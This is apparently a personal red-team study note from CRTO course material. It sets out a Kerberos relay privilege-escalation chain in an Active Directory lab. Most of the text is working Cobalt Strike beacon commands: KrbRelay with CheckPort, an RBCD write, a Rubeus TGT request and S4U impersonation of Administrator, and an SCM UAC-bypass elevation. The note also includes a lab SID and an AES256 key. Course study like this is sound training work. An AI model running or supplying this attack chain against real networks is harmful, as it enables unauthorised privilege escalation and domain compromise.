
1) You need to use [KrbRelay](https://github.com/cube0x0/KrbRelay)
2) Increment your tasks max size, add this line to your Malleable profile

`set tasks_max_size "2097152";`
This implies restarting the C2 and regenerating the payloads. Speed will decrease.

3) Remember this attack involves [[Resource Based Constrained Delegation RBCD]], and you need to control a machine (SYSTEM). If you don't, check the section where you create a new machine (first part) and obtain its SID with this:

`powershell Get-DomainComputer -Identity joseComputer -Properties objectsid`

4) The next step is to find a suitable port for the OXID resolver to circumvent a check in the Remote Procedure Call Service (RPCSS).  This can be done with `CheckPort.exe`.

```
beacon> execute-assembly C:\Tools\KrbRelay\CheckPort\bin\Release\CheckPort.exe
[*] Looking for available ports..
[*] SYSTEM Is allowed through port 10
```

5) With that, run KrbRelay.
```
beacon> execute-assembly C:\Tools\KrbRelay\KrbRelay\bin\Release\KrbRelay.exe -spn ldap/dc-2.dev.cyberbotic.io -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -rbcd S-1-5-21-569305411-121244042-2357301523-9101 -port 10
```

Where:

- `-spn` is the target service to relay to.
- `-clsid` represents `RPC_C_IMP_LEVEL_IMPERSONATE`.
- `-rbcd` is the SID of the fake computer account.
- `-port` is the port returned by CheckPort.

6) You can do a sanity check to see if the msDS property was written correctly

`beacon> powershell Get-DomainComputer -Identity wkstn-2 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity`

7) Because we have the password associated with the fake computer we created, we can request a TGT:
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer$ /aes256:1DE19DC9065CFB29D6F3E034465C56D1AEC3693DB248F04335A98E129281177A /nowrap
```

 then perform an [[S4U2Self Abuse]] to obtain a usable service tickets for our machine
 
`beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:EvilComputer$ /impersonateuser:Administrator /msdsspn:host/wkstn-2 /ticket:doIF8j[...snip...]MuaW8= /ptt`

8) To perform the elevation, we'll use this ticket to interact with the local Service Control Manager over Kerberos to create and start a service binary payload.  To streamline this, we can use a BOF and Aggressor Script that registers a new `elevate` command in Beacon.  It can be found [here](https://github.com/rasta-mouse/SCMUACBypass)

`beacon> elevate svc-exe-krb tcp-local`

### ⚠ Opsec




### Properties
---
📆 created   {{19-02-2024}} 15:36
🏷️ tags: #redteam #crto 

---

